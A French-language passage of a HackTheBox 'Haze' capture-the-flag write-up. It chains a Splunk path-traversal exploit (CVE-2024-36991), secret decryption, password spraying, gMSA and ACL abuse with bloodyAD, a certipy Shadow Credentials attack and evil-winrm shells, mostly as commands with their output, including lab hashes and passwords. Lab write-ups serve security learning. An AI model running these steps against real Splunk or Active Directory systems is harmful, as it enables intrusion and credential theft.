(.venv) ╭─root@exegol-hackthebox /workspace/Haze/CVE-2024-36991  ‹main*›
╰─➤ python3 exploit.py -u http://haze.htb:8000 -s 1

  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _
 / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |
| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| '_ | (_) | (_) | |
| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |
 \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|


CVE-2024-36991
Made by ~PaiN05


Available sections:
1. Credentials & Secrets 🔱
2. Configuration Files 🔥
3. Logs & History [Might Get Freeze] 💀
4. System & Service Files [Might Get Freeze] 💀
5. Apps & Custom Scripts 🔥

[+] Running section 1

[*] Running: curl -s "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/passwd"

admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1
edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1
mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/
mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1
```

Dans le fichier `/etc/system/local/authentication.conf`, je trouve le mot de passe chiffré de `paul.taylor`.
```shell
(.venv) ╭─root@exegol-hackthebox /workspace/Haze/CVE-2024-36991  ‹main*›
╰─➤  python3 exploit.py -u http://haze.htb:8000 -s 1

  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _
 / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |
| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| '_ | (_) | (_) | |
| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |
 \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|


CVE-2024-36991
Made by ~PaiN05


Available sections:
1. Credentials & Secrets 🔱
2. Configuration Files 🔥
3. Logs & History [Might Get Freeze] 💀
4. System & Service Files [Might Get Freeze] 💀
5. Apps & Custom Scripts 🔥

[+] Running section 1

[*] Running: curl -s "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/system/local/authentication.conf"
[splunk_auth]
minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0

[Haze LDAP Auth]
SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth
authType = LDAP
```


Pour la suite j'exploiterai la vulnérabilité manuellement avec une commande `curl` pour avoir des résultats plus précis. Je récupère donc la clé permettant de déchiffrer les hash. Elle se trouve dans le fichier `/etc/auth/splunk.secret`.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  curl --path-as-is -s "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/auth/splunk.secret"
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD
```


En recherchant sur google je vois qu'il faut installer `splunksecret` pour pouvoir déchiffrer le hash.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  python -m pip install splunksecrets

╭─root@exegol-hackthebox /workspace/Haze
╰─➤  splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='
Ld@p_Auth_Sp1unk@2k24

```


Avec `username-anarchy` je génère une liste d'utilisateurs. Je vois alors que les identifiants `paul.taylor:Ld@p_Auth_Sp1unk@2k24` sont valides.
```shell
╭─root@exegol-hackthebox /workspace/Haze/reverse_shell_splunk  ‹master*›
╰─➤  username-anarchy Paul Taylor
paul
paultaylor
paul.taylor
paultayl
pault
p.taylor
ptaylor
tpaul
t.paul
taylorp
taylor
taylor.p
taylor.paul
pt

╭─root@exegol-hackthebox /workspace/Haze
╰─➤  nxc smb dc01.haze.htb -u usernames.txt -p 'Ld@p_Auth_Sp1unk@2k24'
SMB         10.129.168.81   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.129.168.81   445    DC01             [-] haze.htb\paul:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.168.81   445    DC01             [-] haze.htb\paultaylor:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.168.81   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
```


### SMB - TCP 445

Aucun partage intéressant.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  nxc smb dc01.haze.htb -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24' --shares
SMB         10.129.168.81   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.129.168.81   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
SMB         10.129.168.81   445    DC01             [*] Enumerated shares
SMB         10.129.168.81   445    DC01             Share           Permissions     Remark
SMB         10.129.168.81   445    DC01             -----           -----------     ------
SMB         10.129.168.81   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.168.81   445    DC01             C$                              Default share
SMB         10.129.168.81   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.168.81   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.168.81   445    DC01             SYSVOL          READ            Logon server share

```

### BloodHound

Avec l'option `--bloodhound` de `netxec`, je récupère les relations entre les objets du domaine.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  nxc ldap dc01.haze.htb -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24' --bloodhound -c All --dns-server 10.129.168.81
LDAP        10.129.168.81   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        10.129.168.81   389    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
LDAP        10.129.168.81   389    DC01             Resolved collection methods: localadmin, dcom, rdp, objectprops, trusts, group, acl, container, session, psremote
LDAP        10.129.168.81   389    DC01             Done in 00M 13S
LDAP        10.129.168.81   389    DC01             Compressing output into /root/.nxc/logs/DC01_10.129.168.81_2025-07-30_232935_bloodhound.zip
```

## Shell en tant que mark.adams
### Password Spraying

Je récupère les utilisateurs et génère une liste d'utilisateurs.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  nxc smb dc01.haze.htb -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute
SMB         10.129.168.81   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.129.168.81   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
SMB         10.129.168.81   445    DC01             498: HAZE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.168.81   445    DC01             500: HAZE\Administrator (SidTypeUser)
SMB         10.129.168.81   445    DC01             501: HAZE\Guest (SidTypeUser)
SMB         10.129.168.81   445    DC01             502: HAZE\krbtgt (SidTypeUser)
SMB         10.129.168.81   445    DC01             512: HAZE\Domain Admins (SidTypeGroup)
SMB         10.129.168.81   445    DC01             513: HAZE\Domain Users (SidTypeGroup)
SMB         10.129.168.81   445    DC01             514: HAZE\Domain Guests (SidTypeGroup)
SMB         10.129.168.81   445    DC01             515: HAZE\Domain Computers (SidTypeGroup)
SMB         10.129.168.81   445    DC01             516: HAZE\Domain Controllers (SidTypeGroup)
SMB         10.129.168.81   445    DC01             517: HAZE\Cert Publishers (SidTypeAlias)
SMB         10.129.168.81   445    DC01             518: HAZE\Schema Admins (SidTypeGroup)
SMB         10.129.168.81   445    DC01             519: HAZE\Enterprise Admins (SidTypeGroup)
SMB         10.129.168.81   445    DC01             520: HAZE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.168.81   445    DC01             521: HAZE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.168.81   445    DC01             522: HAZE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.168.81   445    DC01             525: HAZE\Protected Users (SidTypeGroup)
SMB         10.129.168.81   445    DC01             526: HAZE\Key Admins (SidTypeGroup)
SMB         10.129.168.81   445    DC01             527: HAZE\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.168.81   445    DC01             553: HAZE\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.168.81   445    DC01             571: HAZE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.168.81   445    DC01             572: HAZE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.168.81   445    DC01             1000: HAZE\DC01$ (SidTypeUser)
SMB         10.129.168.81   445    DC01             1101: HAZE\DnsAdmins (SidTypeAlias)
SMB         10.129.168.81   445    DC01             1102: HAZE\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.168.81   445    DC01             1103: HAZE\paul.taylor (SidTypeUser)
SMB         10.129.168.81   445    DC01             1104: HAZE\mark.adams (SidTypeUser)
SMB         10.129.168.81   445    DC01             1105: HAZE\edward.martin (SidTypeUser)
SMB         10.129.168.81   445    DC01             1106: HAZE\alexander.green (SidTypeUser)
SMB         10.129.168.81   445    DC01             1107: HAZE\gMSA_Managers (SidTypeGroup)
SMB         10.129.168.81   445    DC01             1108: HAZE\Splunk_Admins (SidTypeGroup)
SMB         10.129.168.81   445    DC01             1109: HAZE\Backup_Reviewers (SidTypeGroup)
SMB         10.129.168.81   445    DC01             1110: HAZE\Splunk_LDAP_Auth (SidTypeGroup)
SMB         10.129.168.81   445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)
SMB         10.129.168.81   445    DC01             1112: HAZE\Support_Services (SidTypeGroup)
```


`mark.adams` utilise le même mot de passe que `paul.taylor`.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  nxc smb dc01.haze.htb -u users.lst -p 'Ld@p_Auth_Sp1unk@2k24' --continue-on-success
SMB         10.129.168.81   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.129.168.81   445    DC01             [-] haze.htb\Administrator:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.168.81   445    DC01             [-] haze.htb\Guest:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.168.81   445    DC01             [-] haze.htb\krbtgt:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.168.81   445    DC01             [-] haze.htb\DC01$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.168.81   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
SMB         10.129.168.81   445    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
SMB         10.129.168.81   445    DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.168.81   445    DC01             [-] haze.htb\alexander.green:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.168.81   445    DC01             [-] haze.htb\:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
```


### Evil-WinRM

Je me connecte avec `evil-winrm`. Ce n'est pas cet utilisateur qui possède le flag user. A la racine, je vois un répertoire `Backups` inaccessible à `mark.adams`. A part cela, il n'y a rien de vraiment intéressant.
```powershell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  evil-winrm -i dc01.haze.htb -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24'                                                                 2 ↵

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mark.adams\Documents> cd /

*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/5/2025  12:32 AM                Backups
d-----         3/25/2025   2:06 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---          3/4/2025  11:28 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-r---         7/31/2025  12:27 PM                Users
d-----         3/25/2025   2:15 PM                Windows


*Evil-WinRM* PS C:\> ls Backups
Access to the path 'C:\Backups' is denied.
At line:1 char:1
+ ls Backups
+ ~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Backups:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
*Evil-WinRM* PS C:\>

```


## Connexion en tant que Haze-IT-Backup$
### BloodHound encore

En regardant les résultats de `bloodhound` exécuté précédemment, je remarque qu'il n'y a pas beaucoup d'informations. Je recollecte alors les relations avec `bloodhound` en tant que `mark.adams`.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  nxc ldap dc01.haze.htb -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' --bloodhound -c All --dns-server 10.129.168.81
LDAP        10.129.168.81   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        10.129.168.81   389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAP        10.129.168.81   389    DC01             Resolved collection methods: psremote, dcom, rdp, group, session, acl, objectprops, trusts, container, localadmin
LDAP        10.129.168.81   389    DC01             Done in 00M 17S
LDAP        10.129.168.81   389    DC01             Compressing output into /root/.nxc/logs/DC01_10.129.168.81_2025-07-30_234221_bloodhound.zip
```


`paul.taylor` est membre du groupe `splun_ldap_auth` ainsi que de `domain users`. Rien d'intéressant pour le moment mais cohérent avec ce que j'ai vu jusqu'à présent.
![](/images/Haze/Haze-5.png)


Il l y a l'utilisateur `mark.adams` qui est membre du groupe `gmsa_managers`. En voici un groupe atypique. 
![](/images/Haze/Haze-6.png)


### Récupérer le mot de passe GMSA

Avec `gMSADumper` je vois que mot de passe de appartient à `Haze-IT-Backup$` et que `mark.adams` n'a pas les droits de lecture du mot de passe. Seuls les membres du groupe `Domain Admins` peuvent le lire.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  gMSADumper.py -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -d 'haze.htb'
Users or groups who can read password for Haze-IT-Backup$:
 > Domain Admins
```


En regardant les ACL sur `haze-it-backup$` je vois que les membres du groupe `gMSA_Managers` ont le droit d'écriture sur la propriété `msDS-GroupMSAMembership` sur `Haze-IT-Backup$`. Ce qui signifie que `mark.adams` peut donner le droit de lecture du mot de passe à n'importe quel utilisateur.
```powershell
*Evil-WinRM* PS C:\Users\mark.adams\appdata\local\temp> dsacls "CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB"
<SNIP>
ManagedPasswordInterval
                                      READ PROPERTY
Allow HAZE\gMSA_Managers              SPECIAL ACCESS for msDS-GroupMSAMembership
                                      WRITE PROPERTY
```


C'est aussi possible de le voir avec `bloodyAD`.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  bloodyAD --host "10.129.27.127" -d "haze.htb" -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' get writable --detail
<snip>
distinguishedName: CN=Mark Adams,CN=Users,DC=haze,DC=htb
<snip>
distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
msDS-GroupMSAMembership: WRITE
```


J'upload alors `PowerView.ps1` sur la cible et avec la commande `Set-ADServiceAccount` j'accorde le droit de lecture du mot de passe à `mark.adams`.
```powershell
*Evil-WinRM* PS C:\users\mark.adams\appdata\local\temp> upload /workspace/Haze/PowerView.ps1

Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command

Info: Uploading /workspace/Haze/PowerView.ps1 to C:\users\mark.adams\appdata\local\temp\PowerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\users\mark.adams\appdata\local\temp> .\PowerView.ps1
*Evil-WinRM* PS C:\users\mark.adams\appdata\local\temp> Set-ADServiceAccount -Identity Haze-IT-Backup -PrincipalsAllowedToRetrieveManagedPassword mark.adams
*Evil-WinRM* PS C:\users\mark.adams\appdata\local\temp>
```


Je relance `gMSADumper` et je récupère alors le hash de `Haze-IT-Backup$`
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  gMSADumper.py -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -d 'haze.htb'
Users or groups who can read password for Haze-IT-Backup$:
 > mark.adams
Haze-IT-Backup$:::723fd747a7523dbebfc5b1d3d759ffbf
Haze-IT-Backup$:aes256-cts-hmac-sha1-96:43c649f0cb567989f0ad1e040955fe74dcdc6b1a31baeceb63be0b077d975685
Haze-IT-Backup$:aes128-cts-hmac-sha1-96:56dd4f3a2f9bf1b8721d26ae290b3ac0

```


## Shell en tant que edward.martin
### Bloohound encore une fois

Je vois que `haze-it-backup$` possèdes le droit `WriteOwner` sur le groupe `support_services`. Les membres de ce groupe peuvent soit changer le mot de passe de `edward.martin` soit faire du `Shadow Credential` pour récupérer son hash. `edward.martin` fait parti du groupe `Remote Management Users` ainsi que `backup_reviewers`.
![](/images/Haze/Haze-7.png)

### WriteOwner et genericAll

Je rends `haze-it-backup$` propriétaire du groupe `support_services`. 
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  bloodyAD --host "10.129.168.81" -d "haze.htb" -u 'Haze-IT-Backup$' -p ':723fd747a7523dbebfc5b1d3d759ffbf' set owner 'support_services' 'Haze-IT-Backup$'
[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on support_services
```


Ensuite je lui donne le control total du groupe.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  bloodyAD --host "10.129.168.81" -d "haze.htb" -u 'Haze-IT-Backup$' -p ':723fd747a7523dbebfc5b1d3d759ffbf' add genericAll 'support_services' 'Haze-IT-Backup$'
[+] Haze-IT-Backup$ has now GenericAll on support_services
```


### Ajout de haze-it-support dans le groupe support_services

Enfin je l'ajoute dans le groupe `support_services`.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  bloodyAD --host "10.129.168.81" -d "haze.htb" -u 'Haze-IT-Backup$' -p ':723fd747a7523dbebfc5b1d3d759ffbf' add groupMember 'support_services' 'Haze-IT-Backup$'
[+] Haze-IT-Backup$ added to support_services
```

### Shadow Credential sur edward.martin

Puis je génère un TGT pour `haze-it-backup$`. Avec ce TGT, j'utilise `certipy` pour réaliser l'attaque `Shadow Credential` afin de récupérer le hash de `edward.martin`.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  getTGT.py 'haze.htb/Haze-IT-Backup$' -hashes ':723fd747a7523dbebfc5b1d3d759ffbf'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Haze-IT-Backup$.ccache
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  export KRB5CCNAME=Haze-IT-Backup\$.ccache

╭─root@exegol-hackthebox /workspace/Haze
╰─➤  certipy shadow auto -u 'Haze-IT-Backup$' -k -ns 10.129.168.81 -target dc01.haze.htb -account 'edward.martin'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'edward.martin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e67ac835-300f-e3ba-0745-c660df9fa93c'
[*] Adding Key Credential with device ID 'e67ac835-300f-e3ba-0745-c660df9fa93c' to the Key Credentials for 'edward.martin'
[*] Successfully added Key Credential with device ID 'e67ac835-300f-e3ba-0745-c660df9fa93c' to the Key Credentials for 'edward.martin'
[*] Authenticating as 'edward.martin' with the certificate
[*] Using principal: edward.martin@haze.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'edward.martin.ccache'
[*] Trying to retrieve NT hash for 'edward.martin'
[*] Restoring the old Key Credentials for 'edward.martin'
[*] Successfully restored the old Key Credentials for 'edward.martin'
[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```


### Evil-WinRM

Je me connecte avec `evil-winrm` et je récupère le flag user.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  evil-winrm -i dc01.haze.htb -r haze.htb

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\edward.martin\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\edward.martin\Desktop> ls


    Directory: C:\Users\edward.martin\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         7/30/2025   9:27 PM             34 user.txt


*Evil-WinRM* PS C:\Users\edward.martin\Desktop> type "C:/Users/edward.martin/Desktop/user.txt"
5a7f3f2368bddab815cf9f23bdf8cbd8
```


## Shell en tant qu'alexander.green
### Backup de Splunk

Je me rends alors dans le répertoire `Backups` où se trouve une archive de Splunk que je télécharge.
```powershell
*Evil-WinRM* PS C:\> cd Backups
*Evil-WinRM* PS C:\Backups> ls


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/5/2025  12:33 AM                Splunk


*Evil-WinRM* PS C:\Backups> cd Splunk
*Evil-WinRM* PS C:\Backups\Splunk> ls


    Directory: C:\Backups\Splunk


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          8/6/2024   3:22 PM       27445566 splunk_backup_2024-08-06.zip


*Evil-WinRM* PS C:\Backups\Splunk> download splunk_backup_2024-08-06.zip

```


Je dézippe alors l'archive et s'y trouve les fichiers et répertoires de Splunk
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  cd Splunk
╭─root@exegol-hackthebox /workspace/Haze/Splunk
╰─➤  ls
bin    copyright.txt  lib               license-eula.txt  opt         quarantined_files  share                                          swidtag
cmake  etc            license-eula.rtf  openssl.cnf       Python-3.7  README-splunk.txt  splunk-9.2.1-78803f08aabb-windows-64-manifest  var
```


Je récupère le contenu du fichier `etc/auth/splunk.secret`.
```shell
╭─root@exegol-hackthebox /workspace/Haze/Splunk
╰─➤  cat etc/auth/splunk.secret
CgL8i4HvEen3cCYOYZDBkuATi5WQuORBw9g4zp4pv5mpMcMF3sWKtaCWTX8Kc1BK3pb9HR13oJqHpvYLUZ.gIJIuYZCA/YNwbbI4fDkbpGD.8yX/8VPVTG22V5G5rDxO5qNzXSQIz3NBtFE6oPhVLAVOJ0EgCYGjuk.fgspXYUc9F24Q6P/QGB/XP8sLZ2h00FQYRmxaSUTAroHHz8fYIsChsea7GBRaolimfQLD7yWGefscTbuXOMJOrzr/6B
```


Dans le fichier `etc/passwd` se trouve le hash de l'administrateur. Mais je n'ai pas réussi à le déchiffrer avec `splunksecrets`.
```shell
╭─root@exegol-hackthebox /workspace/Haze/Splunk
╰─➤  cat etc/passwd
:admin:$6$8FRibWS3pDNoVWHU$vTW2NYea7GiZoN0nE6asP6xQsec44MlcK2ZehY5RC4xeTAz4kVVcbCkQ9xBI2c7A8VPmajczPOBjcVgccXbr9/::Administrator:admin:changeme@example.com:::19934

```


Là, il y a beaucoup trop de fichiers donc j'utilise `grep` pour rechercher récursivement les mots qui contiennent un chiffre entre deux signes dollar. Je trouve un `bindDNpassword` dans le fichier `var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf` comme pour `paul.taylor`.
```shell
╭─root@exegol-hackthebox /workspace/Haze/Splunk
╰─➤  grep -rE '\$[0-9]\$' .
grep: ./var/lib/splunk/_introspection/db/db_1722472316_1722471805_2/1722472316-1722471805-7069930062775889648.tsidx: binary file matches
grep: ./var/lib/splunk/_introspection/db/db_1722374971_1722374511_0/rawdata/journal.zst: binary file matches
./var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:pass4SymmKey = $7$u538ChVu1V7V9pXEWterpsj8mxzvVORn8UdnesMP0CHaarB03fSbow==
./var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:sslPassword = $7$C4l4wOYleflCKJRL9l/lBJJQEBeO16syuwmsDCwft11h7QPjPH8Bog==
./var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
grep: ./bin/tsidxprobe_plo.exe: binary file matches
grep: ./bin/splunk-optimize-lex.exe: binary file matches
grep: ./bin/locktest.exe: binary file matches
grep: ./bin/_decimal.p3d: binary file matches
grep: ./bin/splunk-optimize.exe: binary file matches
grep: ./bin/walklex.exe: binary file matches
grep: ./bin/splknetdrv.sys: binary file matches
grep: ./bin/tsidxprobe.exe: binary file matches
./lib/node_modules/pdfkit/lib/mixins/color.coffee:                color = color.replace(/#([0-9A-F])([0-9A-F])([0-9A-F])/i, "#$1$1$2$2$3$3") if color.length is 4
grep: ./opt/packages/identity-0.0.1-ac30d8f.tar.gz: binary file matches
./etc/system/README/indexes.conf.spec:* Unencrypted access key cannot begin with "$1$" or "$7$". These prefixes are reserved
./etc/system/README/indexes.conf.spec:* Unencrypted secret key cannot begin with "$1$" or "$7$". These prefixes are reserved
./etc/system/README/inputs.conf.example:token = $7$ifQTPTzHD/BA8VgKvVcgO1KQAtr3N1C8S/1uK3nAKIE9dd9e9g==
./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with "$1$". This is used by
./etc/system/README/server.conf.spec:    * NOTE: Unencrypted passwords must not begin with "$1$", because this is
./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with "$1$", as Splunk software uses
./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with "$1$", as this is used by
./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with "$1$", as this is used by
./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with "$1$", as this is used by
./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with "$1$", as this is used by
./etc/system/README/outputs.conf.example:token=$1$/fRSBT+2APNAyCB7tlcgOyLnAtqAQFC8NI4TGA2wX4JHfN5d9g==
./etc/system/README/user-seed.conf.example:HASHED_PASSWORD = $6$TOs.jXjSRTCsfPsw$2St.t9lH9fpXd9mCEmCizWbb67gMFfBIJU37QF8wsHKSGud1QNMCuUdWkD8IFSgCZr5.W6zkjmNACGhGafQZj1
./etc/passwd::admin:$6$8FRibWS3pDNoVWHU$vTW2NYea7GiZoN0nE6asP6xQsec44MlcK2ZehY5RC4xeTAz4kVVcbCkQ9xBI2c7A8VPmajczPOBjcVgccXbr9/::Administrator:admin:changeme@example.com:::19934
```


Je le déchiffre et je trouve le mot de passe `Sp1unkadmin@2k24`
```shell
╭─root@exegol-hackthebox /workspace/Haze/Splunk
╰─➤  splunksecrets splunk-decrypt -S etc/auth/splunk.secret --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI='
Sp1unkadmin@2k24
```


En regardant le contenu du fichier, je vois qu'il s'agit du mot de passe d'`alexander.green`.
```shell
╭─root@exegol-hackthebox /workspace/Haze/Splunk
╰─➤  cat var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf                                                        1 ↵
[default]

minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0


[Haze LDAP Auth]

SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb
